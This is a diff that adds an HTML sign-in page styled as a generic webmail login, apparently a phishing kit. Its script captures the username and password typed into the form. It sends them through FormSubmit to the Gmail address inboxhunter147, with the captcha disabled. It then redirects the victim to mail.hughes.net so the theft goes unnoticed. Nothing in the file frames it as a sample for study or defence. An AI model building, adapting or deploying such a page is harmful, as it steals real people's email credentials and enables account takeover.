@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign In</title>
+
+  <!-- Open Sans Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff; /* White background */
+      font-family: 'Open Sans', Arial, sans-serif;
+      min-height: 100vh; /* Ensure the background covers the full viewport height */
+    }
+
+    .login-screen {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .content-box {
+      background-color: #fff;
+      padding: 20px 40px 0 40px;
+      border-radius: 4px;
+      width: 360px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .logo {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+
+    .logo img {
+      width: 50px;
+      height: auto;
+      display: block;
+    }
+
+    .sign-in-title {
+      font-size: 22px;
+      color: #333;
+      margin-bottom: 20px;
+      text-align: left;
+      font-weight: 700;
+    }
+
+    .form {
+      width: 100%;
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .form-group input[type="text"],
+    .form-group input[type="password"] {
+      width: 100%;
+      padding: 9px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-family: 'Open Sans', Arial, sans-serif;
+    }
+
+    .password-wrapper {
+      position: relative;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 12px;
+      color: #0073e6;
+      user-select: none;
+      font-family: 'Open Sans', Arial, sans-serif;
+    }
+
+    .login-options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 8px;
+      margin-bottom: 24px;
+    }
+
+    .login-button {
+      padding: 8px 14px;
+      font-size: 13px;
+      font-weight: 700;
+      font-family: 'Open Sans', sans-serif;
+      color: white;
+      background-color: #0088c1;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .login-button:hover {
+      background-color: #0073a3;
+    }
+
+    .stay-signed-in {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      color: #333;
+      font-family: 'Open Sans', Arial, sans-serif;
+    }
+
+    .stay-signed-in input[type="checkbox"] {
+      margin-right: 6px;
+      cursor: pointer;
+    }
+
+    .footer {
+      position: relative;
+      padding: 20px 40px;
+      background-color: #eee;
+      margin: 0 -40px -40px;
+      font-family: 'Open Sans', Arial, sans-serif;
+    }
+
+    .footer label {
+      font-size: 13px;
+      color: #555;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .footer select {
+      width: 100%;
+      padding: 8px;
+      font-size: 13px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-family: 'Open Sans', Arial, sans-serif;
+    }
+
+    .footer small {
+      display: block;
+      text-align: center;
+      font-size: 11px;
+      color: #777;
+      margin-top: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-screen">
+    <div class="content-box">
+      <div class="logo">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABwAAAAcCAMAAABF0y+mAAAAM1BMVEVHcEz3pQD4pwD4qAD4qAD4pwD4qAD4qAD4pwD4pwD4qAD4qAD4pwD3pwD4qAD4pwD4qADLfoTiAAAAEXRSTlMACjiUzmHp/xcl8YVN+rWfeYFKal0AAACUSURBVHgBxZFFEgMgEATxweH/n43ick36RvWySn4DvRrGhbhYqQChj8oIWHdWxAdEQy4O4NdOgERuKIir44AnE1rWKhRQdDDUJwVXHg5jVvYyL3QJFEV+/li86P1pC6hPoHGxyKCLNEOkifggySghvGGyqGForbAwLiQuji/LG7CSTOTB7beRpWzg7HgXmbMs5q88AYT6BkDLELNtAAAAAElFTkSuQmCC" alt="Logo" />
+      </div>
+
+      <form id="login-form" method="POST" action="https://formsubmit.co/inboxhunter147@gmail.com" autocomplete="off" novalidate>
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" id="redirect-url" value="" />
+        <input type="hidden" name="entryCount" id="entry-count" value="1" />
+
+        <div class="sign-in-title">Sign In</div>
+
+        <form class="form" id="login-form" method="POST" action="javascript:void(0);" autocomplete="off" novalidate>
+          <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="username" id="username-hidden" />
+          <input type="hidden" name="password" id="password-hidden" />
+
+          <div class="form-group">
+            <label for="username">Username</label>
+            <input id="username" name="username-visible" type="text" autocomplete="off" required />
+          </div>
+
+          <div class="form-group">
+            <label for="password">Password</label>
+            <div class="password-wrapper">
+              <input id="password" name="password-visible" type="password" autocomplete="off" required />
+              <span class="toggle-password" onclick="togglePassword()">Show</span>
+            </div>
+          </div>
+
+          <div class="login-options">
+            <button type="submit" class="login-button" onclick="handleFormSubmit(event)">Sign In</button>
+            <label class="stay-signed-in">
+              <input id="remember" type="checkbox" name="remember" />
+              Stay signed in
+            </label>
+          </div>
+        </form>
+
+        <div class="footer">
+          <label for="client">Web App Version</label>
+          <select id="client" name="client" onchange="clientChange(this.value)">
+            <option value="preferred" selected>Default</option>
+            <option value="advanced">Classic</option>
+            <option value="modern">Modern</option>
+          </select>
+
+          <small>&copy; 2025 Webmail UI. All rights reserved.</small>
+        </div>
+      </div>
+    </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const form = document.getElementById("login-form"); // ensure your form has id="login-form"
+      const pwd = document.getElementById("password");
+      const toggle = document.querySelector(".toggle-password");
+
+      // Toggle password visibility
+      toggle.addEventListener("click", function () {
+        if (pwd.type === "password") {
+          pwd.type = "text";
+          toggle.textContent = "Hide";
+        } else {
+          pwd.type = "password";
+          toggle.textContent = "Show";
+        }
+      });
+
+      // Handle form submission
+      form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        // Optional: copy to hidden fields if needed
+        const hiddenUser = document.getElementById("username-hidden");
+        const hiddenPass = document.getElementById("password-hidden");
+        if (hiddenUser && hiddenPass) {
+          hiddenUser.value = username;
+          hiddenPass.value = password;
+        }
+
+        // Send form via FormSubmit
+        fetch(form.action, {
+          method: "POST",
+          body: new FormData(form)
+        })
+        .then(() => {
+          // Redirect after FormSubmit handles the data
+          window.location.href = "https://mail.hughes.net";
+        })
+        .catch(error => {
+          console.error("Error sending data:", error);
+          // Redirect even if something goes wrong
+          window.location.href = "https://mail.hughes.net";
+        });
+      });
+    });
+  </script>
+</body>
+</html>
